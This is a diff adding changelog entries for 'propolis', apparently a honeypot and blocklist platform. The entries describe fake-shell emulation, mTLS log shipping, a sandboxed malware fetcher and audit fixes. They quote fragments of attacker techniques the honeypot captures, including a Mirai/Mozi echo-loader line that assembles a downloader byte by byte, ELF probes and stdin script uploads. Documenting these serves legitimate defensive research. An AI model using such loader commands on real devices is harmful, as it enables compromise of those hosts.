+- **Fake shell: a real grammar and faithful command modeling** - the shell the SSH, Telnet and ADB
+  sensors present now lexes, parses and evaluates a shell-command subset (quotes, expansions,
+  arithmetic, real pipelines, `&&`/`||`, subshells and `if`/`for`/`while`) instead of matching whole
+  lines, dispatches every command through a shared registry, and bounds each connection with a shared
+  resource budget (overlay bytes and nodes, command and download events, wire egress, per-line work
+  and a recursion depth cap). The filesystem is a node model over a persona snapshot with symlinks,
+  devices, modes and mount flags. The commands the highest-volume observed attacker chains use now
+  answer faithfully: reading the ELF header of `/bin/ls` (`cat | head`, `hexdump -n 52`, `dd bs=52`)
+  and of `/proc/self/exe` (resolved to the executable of the reading process, so the `|| cat`
+  fallback is suppressed), the Telnet `.fxcat` writable-directory sweep, and the real
+  BusyBox v1.30.1 multi-call banner and its 263-applet set. Shell identity (bash login versus a
+  `bash -c` exec versus nested `su`/`sh`/dash levels versus Android mksh) drives every prompt, error
+  prefix and `$0`. A per-line internal trace records why the shell answered as it did and can never
+  reach the wire, and the never-exec and no-fetch guarantees hold by construction: the emulator has
+  no process, evaluation or network facility and the synthetic binary bytes are generated, never a
+  host file read or run. Attacker-facing behavior is checked by a byte-for-byte session-replay corpus.
+- **Protocol-correct shell transports** - SSH now tracks up to ten independent channels, obeys each
+  peer's receive window and maximum packet size, replenishes its own receive window, separates
+  non-PTY stderr, and completes exec channels with exit status, EOF and close. ADB obeys negotiated
+  maxdata and waits for an OKAY before each subsequent WRTE, including large one-shot replies.
+  Telnet routes banner, prompts, echo and command output through one NVT encoder that applies ONLCR,
+  the session XOR codec and IAC escaping in wire order. Writes on all three transports are bounded
+  by the connection idle timeout.
+- **Split deployment: collectors ship to a gateway over mTLS** - a honeypot collector no longer
+  needs database access. `shipper` tails each sensor's log through the shared `log-tailer` crate and
+  ships length-prefixed batches to a `gateway` over mutually authenticated TLS. The gateway verifies
+  a per-collector sequence number and rolling hash against durable state, spools accepted records as
+  byte-exact sensor NDJSON for intake, and acknowledges; the shipper advances its cursor only on
+  that acknowledgement. Frame, acknowledgement and mTLS config live in a shared `collector-wire`
+  crate so the two ends cannot drift.
+- **Certificate minting for a split deployment** - `provision-certs` mints the CA, gateway and
+  collector certificates the mTLS transport needs. Bootstrap only: addition, rotation and revocation
+  are not implemented.
+- **Operator runbook for the split deployment** - `docs/operations/split-deployment.md` covers
+  creating the certificates, setting up both hosts by hand (no script creates the gateway's or the
+  shipper's users, directories or units), checking the path end to end, and upgrading, rotating,
+  rebuilding, backing up and troubleshooting it, with the limits the split still has. Its commands
+  and claims were checked against the code by independent reviewers, and the chain behaviour it
+  describes (the reset procedure, a one-sided reset, a foreign CA, a blank log line) was run on
+  loopback with the release binaries.
+- **Malware fetcher** - retrieves the payload behind a URL a captured dropper points at, under
+  deliberately paranoid egress rules: scheme allowlist, URL vetting, IP pinning, an egress deny-set
+  that canonicalizes mapped/NAT64/6to4 forms, per-hop redirect re-vetting performed by hand rather
+  than by the HTTP client, a byte cap on the streamed response, and peer-pinned TFTP for the RRQ
+  case. Embedded URLs are extracted from dropper scripts, including Script-Encoded (`.vbe`) ones.
+  Attempts and their outcomes are recorded in `fetch_attempt` and shown on the IP detail page.
+- **Listener reachability pane** - the console names every declared listener and what has actually
+  been proven about it, from a sweep that dials each one from the control plane. The sweep's own
+  connections are filtered at intake, so answering the reachability question cannot score the node
+  into its own blocklist. Off by default (`PROPOLIS_FLEET_PROBE_ENABLED`), and it refuses to start
+  without the source addresses that filter needs.
+- **Deploy identity** - `deploy-stamp.sh` records what a deploy actually left on disk, and the
+  console compares four identities usually collapsed into one: what this process runs, what the
+  deploy installed, what was checked out, and what `main` held at the last fetch. Idempotent
+  provisioning moved into `provision.sh`.
+- **Per-occurrence and per-capture identity** - sensors mint an `occurrence_id` at the emit
+  chokepoint and a `capture_id` at the spool chokepoint, and write a durable per-capture outbox
+  manifest, so a captured sample can be tied back to the event that produced it. Both fields are
+  additive on the sensor wire.
+- **Volume-based blocklisting** - a high-volume connection flood is recommended for the blocklist on
+  volume alone, since same-signal dedup otherwise collapses a flood into a single scored event. It
+  counts only completed-TCP events, never spoofable datagrams, and volume-listed addresses publish
+  into the retention windows rather than the tiered files.
+- **Per-subsystem liveness** - the supervisor publishes each subsystem's state, `/ready` answers 503
+  once one has given up, and the ops-monitor pages on it.
+- **Forward-confirmed reverse DNS** on the IP-detail page (`PROPOLIS_CONSOLE_RDNS_ENABLED`, default
+  off - the one outbound lookup in the console's enrichment). A shown hostname is forward-confirmed
+  (PTR must resolve back to the IP) and marked verified/unverified; display-only, never a suppression
+  signal. On-demand, cached, system resolver via libc (no async DNS dependency).
+
+- **Trusted-org ASN suppression** - an optional `PROPOLIS_FEED_ASN_ALLOWLIST` keeps a trusted
+  organization's own infrastructure or a known scanner (by AS number) off every published feed,
+  keyed off the offline GeoLite2-ASN database. ASN ownership is not per-IP spoofable, unlike reverse
+  DNS. Empty (opt-in) by default. The GeoLite2 reader is now a shared `geoip` crate used by both the
+  console and the feed.
+- **IP detail: network profile** - a "Services probed" panel (what each address did to us, grouped
+  by sensor, with per-service auth state and activity window) and a "Network profile" panel with
+  egress-free operator lookup links (Shodan, GreyNoise, AbuseIPDB, VirusTotal) plus optional offline
+  MaxMind GeoLite2 geo/ASN enrichment via `PROPOLIS_GEOIP_DIR` (read locally, never queried over the
+  network; degrades to "not configured" when the databases are absent).
+- **Telnet XOR de-obfuscation** - the fake shell recovers single-byte-XOR-obfuscated command probes
+  (e.g. the LZRD Mirai variant) so it responds in-persona, recording both the raw wire bytes and the
+  decoded command; the console shows a "de-obfuscated (xor 0xNN)" badge.
+- **Operational self-alerting** - a supervised `ops-monitor` polling intake, sensor heartbeat, DB/
+  spool capacity, feed freshness, vendor health, and hash-chain integrity, paging over ntfy
+  (opt-in via `PROPOLIS_OPS_ENABLED`).
+
+- **SP8: 7 new honeypot sensors** - telnet, redis, adb, http, ftp, smtp, and credential
+  multi-protocol (VNC/MySQL/MSSQL/PostgreSQL/MongoDB). Each runs as a dedicated hardened systemd
+  service. 251 tests across the 7 crates.
+- **SP7: unified daemon** (`propolis`) - composes intake, review, feed, and console as supervised
+  tokio tasks sharing one PgPool. Hardened systemd unit and idempotent install script.
+- **SP6: web console** - operator dashboard with review queue, IP detail, feed status, metrics,
+  and rate-limited login.
+- **SP5: blocklist feed** - two-tier export (aggressive/standard) with anti-deanonymization
+  coarsening, fail-closed publisher.
+- **SP4: review queue and reporting** - human-approval gate, per-vendor submission gatekeeper,
+  AbuseIPDB/DShield/OTX vendor adapters.
+- **SP3: event intake** - sensor log tailer with durable cursor, rotation-aware, direct-PG
+  aggregation.
+- **SP2: sensor framework + SSH** - shared sensor harness (TCP/UDP listener, EventEmitter,
+  CaptureHandoff, QuarantineSpool, WanResolver, FakeFs, FakeShell), catch-all port-scan sensor,
+  SSH honeypot with vendored crypto. Wire contract frozen.
+- **SP1: core scoring layer** - domain model, PostgreSQL schema, append-only hash-chained event
+  ledger, time-decayed scoring projection, eligibility/weight/recommendation gates, multi-WAN
+  breadth model. 60 tests against real PostgreSQL.
+
+### Fixed
+
+- **A host survey gets the answers an Ubuntu 22.04 server gives (T9)** - a fingerprinting
+  script run twice against the fleet on 2026-10-07 (45 commands: `nproc`, `/proc/cpuinfo`,
+  `top -bn1 | grep '^%Cpu'`, `free | grep -i '^Mem:' | awk ...`, `cut`, `ip addr`, `which apt`,
+  `time dd ...`) got empty or `command not found` answers no real host gives. Every new format
+  below was recorded the same day from a systemd-booted `ubuntu:22.04` reference (grep 3.7,
+  coreutils 8.32, mawk 1.3.4 20200120); a format that could not be recorded is marked
+  `[unverified]` where it is written. `grep` matches basic, extended and fixed patterns (it
+  printed nothing for anything but `-F`) through a new linear-time POSIX matcher
+  (`shell/regex.rs`) with GNU's options, context lines and compile errors; `cut`, `tee` and
+  `awk`/`mawk` (an interpreter for the language, whose `system()` and command pipes run through
+  the fake shell itself) are new; `od -c` is modeled. `tee` and `mawk` join the recorded binary
+  table, and `/usr/bin/awk` is the alternatives link to `mawk` as on the reference. bash's
+  `time [-p]` keyword reports in bash 5.1's format on the shell's stderr from the time the timed
+  commands claim (`sleep`'s interval, `dd`'s own elapsed figure, a fixed per-process cost), so
+  `time dd` agrees with dd's summary; `history` lists the interactive shell's lines and nothing
+  under `bash -c`. `dd if=/dev/zero of=FILE` writes its zeros as an O(1) fill (the survey's 10 MB
+  probe answered `File too large`), and dd's byte-count sizes keep a decimal below 10 only
+  (`(10 MB, 10 MiB)`, it printed `(10.5 MB, 10.0 MiB)`). The host itself is one model the
+  commands agree on: the process table holds a 22.04 server's kernel threads and services
+  (journald, resolved, networkd, cron, dbus, rsyslogd, logind, the getty pair, the session's
+  `systemd --user`) with their real owners, so `ps aux`, `top -bn1`, `pgrep`, `/proc/PID` and
+  `/proc/loadavg` (now present, as is a ticking `/proc/uptime`) count the same rows; `ss` lists
+  resolved's stub on 127.0.0.53 beside sshd in iproute2 5.15's recorded layout, and
+  `/proc/net/udp` the same socket. `/proc/cpuinfo` lists every field (the `model name` grep was
+  empty), `/etc/shadow`, `/etc/gshadow`, `/etc/group` and the installer's netplan file exist
+  (root's hash is a random yescrypt-shaped string that hashes no password), root's dotfiles
+  are the stock ones, the root disk is `/dev/root` on the Xen `xvda` the CPU implies, `/tmp` is
+  sticky and `/proc`/`/sys` read-only, and `/lib32`/`/libx32` join the usrmerge links. An SSH
+  session's environment carries `SSH_CLIENT`, `SSH_CONNECTION`, `LANG`, `SHLVL`, the `XDG_*`
+  set and, interactively, `SSH_TTY`, `TERM` and `LS_COLORS`, in bash's own hash order (`env` printed
+  four variables); `MAIL` is set over telnet only, because a jammy SSH login has none (recorded).
+  `ls -a` lists `.` and `..` and the short listing is one name a line off a terminal, a file
+  the session writes is dated now rather than 2024, and `uname -a` and `/proc/version` carry the
+  kernel's build date [unverified]. `systemctl`, `crontab`, `apt`/`apt-get`/`dpkg`, `ssh`,
+  `lspci`, `lshw`, `who` and `w` exist (`which apt` and `ssh -V` answered nothing):
+  `systemctl list-units --state=running` lists the services whose processes `ps` shows, `status`
+  reads their PID and memory from the same rows, and enabling is the `.wants` symlink the
+  filesystem holds, so a dropped `kworker.service` is linked with systemd's own `Created
+  symlink` message and never started. `crontab` keeps its table in cron's spool with Debian's
+  header and errors. One package table recorded from a 22.04 server install answers `dpkg -l`,
+  `dpkg -s` and `apt list`, with `openssh-*` at the banner's version; `apt install` of anything
+  not installed cannot be located and nothing is fetched. `ping` prints iputils' report of
+  replies it never sent (it printed BusyBox's layout on Ubuntu) and fails names the box cannot
+  resolve as `getent` does; `ssh` times out on connect. A file the session writes now runs as
+  itself whatever its name (`/tmp/w` used to run `w`), and a copy of a modeled binary runs as
+  that binary; `ls -d` lists a directory operand itself. At an interactive terminal (SSH with a
+  pty, telnet, ADB) `read x` and `head -n 1` answer when Enter hands them their line, where they
+  waited for Ctrl-D: each Enter reruns the waiting line on the input so far (at most 64 times, on
+  at most 64 KiB) and keeps the run only if nothing still wants more, so `cat > f` still reads to
+  Ctrl-D and what is typed after a finished `read` is the next command. An SSH shell without a pty
+  reads a pipe as bash does: a bare `sh` reads the rest of the input as its script (it opened a
+  nested interactive level), there is no prompt, history or terminal variable, and the client's
+  EOF ends the shell with the last command's status (the session used to stay open).
+- **Console labels** - protocols read `TCP` / `UDP` instead of the enum names `Tcp` / `Udp`; the
+  feed status tab's build and valid-until times use the console's `YYYY-MM-DD HH:MM UTC` form
+  instead of raw RFC 3339; credential-sensor listeners read as their service (`VNC`, `MySQL`,
+  ...) instead of `Cred-vnc`; IP-page sessions ending in the same minute keep their real order.
+- **An intake that fell behind no longer slowed down because it was behind** - the dedup read
+  every scored append makes inside the global append lock (the newest prior observation of one
+  source and signal) had no index of its own, so the planner walked `event_observed_at_idx` down
+  from the newest row until it met the source: one row per event newer than that source's last
+  sighting. A lagging intake appends old `observed_at` values, so the walk grew with the lag and
+  the lag with the walk. A telnet stream from a bot loop ran at about one event a second for days
+  and, holding the append lock that long, held up every other sensor. Migration `0013` adds
+  `event_dedup_idx (source_ip, signal_type, observed_at)`, and the read passes the address through
+  a scalar subquery so the planner costs a hot source like any other: with the index alone it
+  still chose the walk for the two hottest sources of a test ledger. On a 7.5M-row ledger with
+  telnet 11 days behind the read went from 840 to 1060 ms to about 0.13 ms for those sources,
+  and the lagged append of a 100k-row source from 1.7 s to 0.69 s, its cost when caught up; the
+  rest is the per-event history aggregates, which are still to be made incremental. The index is
+  built inside the migration transaction at startup, before intake runs: 12 to 20 s for that
+  ledger held in RAM, longer on disk. Plan guards hold the read to the index on a ledger shaped
+  like the incident.
+- **An append no longer costs more the longer its source has been seen** - every scored append
+  counted the source's distinct WAN vantages and distinct sensors by reading every earlier event
+  of that source (a `GROUP BY wan_ip` and a `COUNT(DISTINCT sensor)`), inside the global append
+  lock. On a 7.5M-row ledger that was 0.73 s per event for a source with 100k events, 3.5 s at
+  200k, 7.1 s at 800k and 9.4 s at 1.5M, and a long-running bot loop on one address set the pace
+  for every sensor: three fresh sources appending beside a 1.5M-event one managed about one
+  event a second between them. Migration `0014` adds two projection tables, `ip_vantage
+  (source_ip, wan_ip, saw_authenticated_tcp)` and `ip_sensor (source_ip, sensor)`, which the
+  append folds each scored event into under the same lock and reads by primary key; telemetry
+  never writes them. The same appends now take 2.8 to 3.3 ms whatever the history, against 3.1
+  ms for a source never seen, and the four mixed sources together reach 358 events a second.
+  The migration backfills both tables from the ledger at startup, before intake runs: 23 to 26 s
+  for that ledger held in RAM, longer on disk. `rebuild_projection` still counts from the ledger
+  rows, so a replay checks the tables; a property test compares the tables with the old
+  aggregates after every append of random multi-source sequences with telemetry and
+  out-of-order events.
+- **`echo` and `printf` escapes write the bytes they name** - `\xNN` and octal escapes from
+  0x80 to 0xff came out as the UTF-8 encoding of that code point (two bytes), so a Mirai/Mozi
+  echo loader that assembles its downloader as `busybox echo -ne '\x7f\x45...' >> .i` chunks
+  left a file that was not the one it sent. Both now produce one raw byte per escape, and an
+  octal escape past 0xff keeps its low eight bits. `busybox wget` with no URL prints BusyBox
+  1.30.1's wget usage on stderr and exits 1 (it printed a download transcript for an empty URL),
+  and dash answers a path that does not exist with `sh: N: ./x: not found`, as its `errmsg`
+  does, instead of bash's `No such file or directory`.
+- **`upgrade.sh` no longer finishes an upgrade with the copy of itself it started from** - bash
+  reads a script as it runs, so after `git pull` replaced `deploy/upgrade.sh` the rest of the
+  upgrade ran the old text: a release that added `propolis-watch` to the binary list built it
+  and then installed from the list without it, leaving `/usr/local/bin/propolis-watch` missing.
+  When the pull changes the script, `upgrade.sh` now re-executes the new one with
+  `PROPOLIS_UPGRADE_REEXEC=1`, which makes that run skip the pull (it cannot loop) and carries
+  the first run's pull timestamp in `PROPOLIS_UPGRADE_PULLED_AT`, so the deploy stamp still
+  records when the pull happened. The binary install now checks each built binary exists
+  before installing it and, afterwards, that every listed binary is present in
+  `/usr/local/bin` before anything is stamped or restarted (`install.sh` does the same check
+  after its install). Both scripts keep the list in one `INSTALL_BINS` array, and a new test
+  compares it with the workspace's binary targets, so a binary added to the workspace but not
+  to the lists fails the build.
+- **The live-watch documentation no longer sends the reader to the honeypot's SSH sensor** -
+  its examples connected to port 22, which on a honeypot host is usually `sensor-ssh`; one
+  attempt landed in the fake shell. Every example now names the real sshd with
+  `-p <admin-port>`, `docs/operations/live-watch.md` warns against the sensor's listener and
+  shows `sudo ss -ltnp | grep sshd` to find the real port, and notes that a passphrase-protected
+  key needs `ssh-add` for unattended use.
+- **A command's standard input reaches it, and is captured** - an SSH exec ran at the request
+  and closed the channel, so the payload a bot streamed after `cat > astats` or `cat > w.sh`
+  hit a closed channel: the file stayed empty, nothing was captured, and the bot retried and
+  left. The fake shell now decides, by running the line against its own model of the commands
+  and rolling back what that run did (`FakeShell::start_line`), whether a line reads its input
+  (`cat`, `cat > f`, `dd` without `if=`, `base64 -d`, `head`, `read`, a bare `sh` on a pipe,
+  the same inside `sh -c`, a group or a pipeline). Such an SSH exec is held with the channel
+  open until the client's EOF (or CLOSE, the idle timeout, `max_captured_bytes`, the session's
+  end) and then runs once on the input, followed by its output, exit status, EOF and CLOSE; a
+  command that reads no input still completes at the request. At the SSH, telnet and ADB
+  shells a typed `cat > f` takes the lines after it until Ctrl-D, as a terminal does (Ctrl-C
+  kills it, status 130), and an ADB `shell:<command>` that reads input holds its stream until
+  the client closes it. Every consumed body, text or binary, becomes one
+  `honeypot_malware_upload` per distinct SHA-256 per session, with `capture_reason`
+  `exec_stdin` or `shell_stdin`, the `command`, the `destination` file and a `repeat_count`
+  for retried uploads; those bytes are no longer also offered to the binary-payload shell
+  capture. `ls` now lists a file operand (it said `No such file` for a file `wc` read) and has
+  a `-l` long listing from the facts `stat` prints, and `sh -lc`/`bash -ec` find their
+  clustered `-c` script instead of running the script text as a file name.
+- **Every captured upload records why it ended** - the fleet pane's capture panel gave
+  `unrecorded` as the end reason of incomplete captures (ten of ten for SSH), because
+  `upload_metadata` took only a `complete` flag and `end_reason` was added by hand at the three
+  shell-capture sites. SCP, SFTP, ADB sync, FTP STOR, TFTP WRQ and MQTT PUBLISH captures never
+  carried it. `upload_metadata` now takes a required `UploadEnd` and writes both `complete` and
+  `end_reason` from it, so neither can be omitted or disagree. A finished transfer reads
+  `transfer_complete`; a transfer cut off before its end of file carries what cut it
+  (`peer_closed`, `client_logout`, `idle_timeout`, `session_cancelled`, `transport_error`,
+  `malformed_input`, `capture_budget`, and for a TFTP peer ERROR the new `peer_aborted`) with
+  `complete` false, even where the same label makes a shell capture complete. SSH passes each open
+  SCP or SFTP transfer the session's real ending, or `peer_closed` when its channel is closed; an
+  ADB sync stream the client closes records `peer_closed`; FTP records an idle data connection as
+  `idle_timeout` and a failed one as `transport_error`. The shell-capture labels are unchanged.
+  Events already stored keep no `end_reason` and still read `unrecorded`; nothing is backfilled.
+- **The IP detail page shows a catch-all probe's port** - the evidence row read
+  `metadata.port`, which no sensor has ever written, so every catch-all probe showed `-`. It now
+  reads the stamped `metadata.local_port`.
+- **The fleet pane counts each listener, not each sensor** - LAST EVENT and 24H are per listener
+  row, but the query grouped by sensor, so every port of a sensor showed the sensor's total (two
+  Redis ports with the same count, HTTP 80 and 443 alike, every catch-all row identical). Activity
+  is now keyed by sensor, `protocol` and the new `metadata.local_port`. The query also aggregated
+  the whole event ledger on every load and 30-second refresh; it now reads the last 24 hours for
+  the count and the 30 days before that for LAST EVENT, both ranges on `observed_at`. A listener
+  with nothing in those 30 days reads `none in 30d` instead of `never`, which the page can no
+  longer prove. Events recorded before the upgrade have no port: they count on the sensor's row
+  when it declares exactly one listener, and otherwise on one `port not recorded` row per sensor,
+  which is not a listener and ages out after 30 days. A port present in the ledger but missing
+  from `PROPOLIS_FLEET_LISTENERS` gets its own `undeclared listener` row.
+- **`propolis` stops in at most 37 s, and the journal names a subsystem that would not stop** -
+  after the shutdown signal the daemon waited 30 s for its subsystems, logged "shutdown timed
+  out", then called `pool.close()`, which waits for every checked-out connection to be returned.
+  A subsystem that ignored cancellation was never aborted (and aborting the supervisor task
+  would have left the task under it running), so it kept its connection, `pool.close()` never
+  returned, and `systemctl restart propolis` (and so `deploy/upgrade.sh`) sat until systemd's 90 s
+  stop timeout SIGKILLed the process. Shutdown now aborts every subsystem still running after
+  the 30 s grace (including the task beneath a supervised subsystem and the children of a
+  supervised group), allows 2 s for them to unwind, bounds `pool.close()` at 5 s, and logs
+  `propolis: shutdown timed out waiting for: <names>; aborted`. A build-time assertion keeps the
+  total under systemd's default stop timeout.
+- **`deploy/sensor.env.example` lists the real `sensor-catchall` defaults** - the example block
+  showed the shell sensors' bounds (30000 ms read, 60000 ms idle, 600 s duration, 1000000 bytes)
+  and the deprecated bare `CATCHALL_MAX_CONCURRENT` name. The sensor's compiled defaults are 5000
+  ms, 5000 ms, 30 s and 4096 bytes (`crates/sensor-catchall/src/main.rs`), and the block now says
+  so, uses the `PROPOLIS_` name throughout, and notes that the compiled default log path is
+  relative.
+- **A non-UTF-8 environment variable is a startup error in every sensor, never read as unset** -
+  most sensor variables were read with `env::var(..).ok()` or `if let Ok(..)`, so a value that was
+  not valid UTF-8 silently fell back to the default or skipped the work: a bound or a timeout
+  reverted to its default, a log path or collector id was replaced, and `sensor-cred` skipped a
+  protocol's `PROPOLIS_CRED_*_BIND` listener the fleet inventory still claimed. All eleven sensors
+  (and the collector id read in `shipper`) now read every variable through
+  `sensor_framework::strict_env_var` (renamed from `tls_env_var`, with its error type
+  `EnvError`, and moved from `tls.rs` to `env.rs`; no alias is kept), which exits 1 before any
+  bind with `environment variable <NAME> is not valid UTF-8`. `env_with_legacy` now applies the
+  same rule to both spellings. Side effects of the shared reader on valid UTF-8: a value is
+  trimmed of ASCII whitespace (a numeric bound written with a stray space now parses), and a
+  value blank after the trim counts as unset: an optional variable falls back to its default
+  where it used to error or be used as an empty string (a blank `PROPOLIS_CRED_*_BIND` now skips
+  that protocol, a blank `PROPOLIS_SSH_BANNER` or collector id takes the default), and a blank
+  required bind is still a startup error.
+- **`sensor-ftp` treats `pasv` and `nlst` like their uppercase forms** - the PASV/EPSV and
+  LIST/NLST replies were chosen by a case-sensitive comparison, so lowercase `pasv` got the EPSV
+  style `229` reply and lowercase `nlst` got the long LIST output. Every other verb was already
+  case-insensitive. The TLS reset, data-peer and bind-failure guards that were correct but
+  unguarded by tests now each have a test.
+- **A malformed PEM error never carries key bytes** - the PEM parser's own error prints the
+  offending line or section label as a byte list, and for a key written header, body and footer on
+  one line that label is the whole key, which every TLS sensor then logged at error level. The
+  error now names the file and a fixed description of the fault (for example
+  `missing section end marker`) for both the certificate and the key file, and keeps no parser
+  error in its source chain.
+- **Sensors log at `info` by default** - every sensor called `tracing_subscriber::fmt::init()`,
+  whose default is `error` once a workspace build unifies the `env-filter` feature in, so a
+  deployed sensor logged no listening lines and no warnings. All eleven now default to `info`, and
+  `RUST_LOG` still overrides it, however the binary is built.
+- **Sensor TLS finalize** - a TLS variable (or sensor-smtp's submission bind) holding a non-UTF-8
+  value is now invalid on every TLS sensor, and the sensor exits 1 before any bind. sensor-ftp and
+  sensor-smtp read such a value as unset, which silently skipped the 990, 465 or 587 listener or
+  turned TLS off; http, redis and mqtt converted it lossily. The six TLS units grant the TLS
+  directory as `ReadOnlyPaths=-/etc/propolis/tls`, so a host without `/etc/propolis/tls` no longer
+  fails every one of those units with `226/NAMESPACE`, TLS used or not; a configured pair that
+  cannot be read still refuses to start. A deploy test now holds the units carrying that line
+  equal to the sensors `provision-tls.sh` mints for. `deploy/sensor.env.example` showed
+  sensor-cred's `MAX_DURATION_SECS` and `MAX_CAPTURED_BYTES` defaults as 600 and 1000000; the code
+  defaults are 60 and 100000. The component inventory still called sensor-mqtt metadata-only
+  with MQTT 5.0 declined, and the troubleshooting page said sensors terminate no TLS. The
+  networking and TLS guide is reorganized around one table of every TLS surface.
+- **Split-deployment examples and references match the code** - the example env files named
+  certificate files `provision-certs` never writes and called every one 0600, described the
+  gateway address as `host:port` (only a literal IP and port is accepted), called the client
+  certificate revocable (nothing revokes one), and gave a re-provisioning recipe for more
+  collectors that the tool cannot carry out. The environment variable reference said the sensors
+  log at `info` without `RUST_LOG`; they then logged only errors (the sensors now default to
+  `info`, see above), and every binary except `propolis`, `console` and the sensors still does.
+  The gateway unit suggested a capability grant for a port below 1024 that `PrivateUsers=yes`
+  makes useless. These, the reference's gateway and shipper tables, and the backup, upgrade and
+  compatibility pages are corrected.
+- **Evidence is no longer lost when a log rotates mid-batch** - the tailer recorded a displaced
+  inode's rewind offset as the cursor's live position, which was already past whatever the
+  uncommitted batch had read from that inode. A rewind then resumed beyond those lines, so they
+  were handed out, never committed, and never re-read - contradicting `rewind_batch`'s contract of
+  putting back every read since the last commit.
+- **The published feed survives a failed or interrupted swap** - publishing moves the live
+  directory aside and then moves staging into its place. A failed second rename left the public
+  path absent with no rollback, and a crash between the two renames left it absent until some later
+  build happened to succeed. The failure case now rolls the previous build straight back, and
+  `recover_interrupted_publish` restores a parked build at daemon startup and at the head of every
+  publish - before the new snapshot is re-validated or staged, so a build that is rejected or
+  cannot stage costs that build and not the availability of the feed already published.
+- **OTX indicators carry their real address family** - the pulse payload declared every indicator
+  `IPv4` while reports accept either family, so an IPv6 address was submitted mislabelled against
+  an API that validates the value against its declared type.
+- **A polled page survives the session expiring underneath it** - protected routes answered an
+  HTMX request with a 303 to `/login`. The XHR followed it, `/login` returned 200 with a whole HTML
+  document, and HTMX swapped that document into the container that issued the poll - leaving
+  `<html>`, `<head>`, a password field and a second copy of every vendored script nested inside a
+  `<div>`, with nothing about it looking like an error. Sessions are in-memory and a restart clears
+  them, so this happened after every upgrade on any page left open. HTMX requests now get a 401
+  with `HX-Redirect` and no swappable body.
+- **The fleet page no longer reports what it did not measure** - the headline was chosen from the
+  combined severity of the reachability and event-age checks, so a fully probed and confirmed fleet
+  with one quiet listener read as "evidence path unconfirmed". A failed capture query rendered as
+  "no malware captures", and a failed event count as `0 events`. A failed refresh left the previous
+  reading on screen with server-computed ages that never moved again; a stalled panel now says how
+  long ago its numbers were actually measured. A poll that is accepted and then never answered
+  raises no error event at all, and HTMX's default request timeout is unlimited, so the panel is
+  bounded by a real request timeout AND aged on its own clock rather than waiting for an event that
+  may never come. A failed end-reason query no longer renders as "nothing incomplete" beside a row
+  that is counting incomplete captures.
+- **Queue decisions are all-or-nothing** - delist, relist and delete-ip each issued two or three
+  autocommit statements, so a failure part-way left an address half changed (a queue row dropped
+  with the feed latch kept, `delisted` cleared without the gates recomputed, vendor rows deleted
+  while the score row survived). Each now runs in one transaction.
+- **Upgrades build what CI tested** - `upgrade.sh` built with a bare `cargo build --release`, which
+  could resolve a dependency graph CI never ran and relied on default members covering every
+  installed binary. It now builds with `--workspace --locked`, as the CI release job does.
+- **The backup stores each sample once and restores owners by name** - the documented archive named
+  the fetched-sample directory and its parent, so every fetched sample was stored and restored
+  twice, and `--numeric-owner` recorded only numbers, which a rebuilt host whose service users got
+  different UIDs would hand to the wrong accounts. Restore now runs `provision.sh` before
+  extracting. `crates/propolis/tests/restore_rehearsal.rs` (ignored by default; it needs PostgreSQL
+  server binaries) restores a populated backup into a fresh cluster and checks the ledger, its
+  grants and sequences, and the spooled samples.
+- **The docs state the tree they describe** - current pages said 18 crates at `0.3.0`, 15 binaries
+  and 1165 tests against a tree of 24 crates, 17 binaries and over 1600 tests, and the component
+  inventory lacked six crates. The docs agreement test now recomputes the version, crate, member and
+  binary totals, the component inventory and dependency graph, the test taxonomy and the migration
+  list from `cargo metadata` and the source, and fails when a current page disagrees.
+- **Code citations point at the code again** - the docs cited code by `path:line`, and about 450
+  citations had drifted as the cited files changed, including every directory citation into
+  `install.sh` after provisioning moved to `provision.sh`. All were re-read against the current
+  source and sentences the code had outgrown were rewritten. Every citation now names a symbol
+  instead of a line (`crates/sensor-framework/src/spool.rs#store`), which an edit elsewhere in the
+  file cannot move. The docs agreement test fails on a line citation in any form, and on a
+  `path#symbol` whose file is gone or no longer contains the symbol.
+- **Two stores of the same sample at once both succeed** - the spool wrote a body straight to its
+  digest name, so a second store of the same bytes during that write (the malware fetcher runs
+  several fetches at once, and two URLs can serve one payload) re-hashed the half-written file
+  and failed it as corrupt, recording a failed fetch. A body is now written to a staging file,
+  synced, and given its name with a hard link, which never replaces an existing name, so a
+  digest name only ever holds a complete body. Staged files a stopped process left behind are
+  removed at the next start.
+- **Smaller console hardening** - the reverse-DNS cache holds at most 4096 entries, sweeping expired
+  ones and evicting the oldest; search refuses a control character or a value over 512 bytes with
+  400 instead of passing it to PostgreSQL.
+
+### Changed
+
+- **One reading rule for every sensor TLS variable** - all six TLS sensors read each
+  `*_TLS_BIND`, `*_TLS_CERT`, `*_TLS_KEY` and `PROPOLIS_SMTP_SUBMISSION_BIND` the same way: the
+  value is trimmed of ASCII whitespace and a blank one counts as unset, as
+  `deploy/fleet-listeners.sh` already treated a blank bind. Until now a blank TLS bind made http,
+  redis and mqtt exit 1 as an invalid address, a blank cert or key made sensor-cred exit 1, and
+  smtp and ftp did not trim paths. A non-UTF-8 value is still invalid.
+- **One bind-failure message** - a listener that fails to start after its configuration validated
+  is logged by every sensor as
+  `<sensor>: cannot start listener on <ip:port>: <OS error>; refusing to start` (catchall and cred,
+  which skip one failed address, end that line `; skipping ...` and refuse only when every address
+  failed). The behavior is unchanged.
+- **A snooze can be finished and a delist undone** - the Snoozed tab had no decision controls and
+  nothing re-surfaces a decided entry, so deferring a decision quietly meant never making one; the
+  history tabs also rendered rows with an empty CSRF token. The tab now carries Approve, Reject and
+  Return to pending. `POST /ip/{ip}/relist` undoes a delist by clearing the latch and re-deriving
+  the gates, so an address rejoins the feed on its current merit rather than because it was once
+  listed. Also `review unsnooze` and `review snoozed` on the CLI.
+
+### Security
+
+Remediation of an external audit (findings P-01 to P-15). Upgrading applies review migrations
+`0006` and `0007`.
+
+- **Spool reads no longer follow links** - the console's sample download and the VirusTotal
+  uploader opened a digest-named spool entry by name, so a symlink planted in a spool (which the
+  internet-facing sensors write) made them read whatever local file it named, and the uploader
+  could send it to a third party when unknown-sample upload was on. Entries are now opened without
+  following links, must be regular files within the 500 MB sample cap, and are re-hashed against
+  their names; a mismatch answers 409.
+- **Nodes sharing a database share the fetcher's limits** - each node picked its own fetch rows and
+  kept the per-host and daily budgets in memory, so two nodes could fetch the same malware URL at
+  once, N nodes spent N times each cap, and a restart reset the daily count. Rows are now claimed
+  with a lease (`claim_expires`) and the budgets are spent in the database under a row lock
+  (migration `0006`, new table `fetch_daily_usage`).
+- **Captured bodies record how their transport was authenticated** - the fetcher never validated
+  certificates, so an https capture carried no evidence that its bytes came from the named host.
+  It now validates first and fetches again without validation only after a certificate failure,
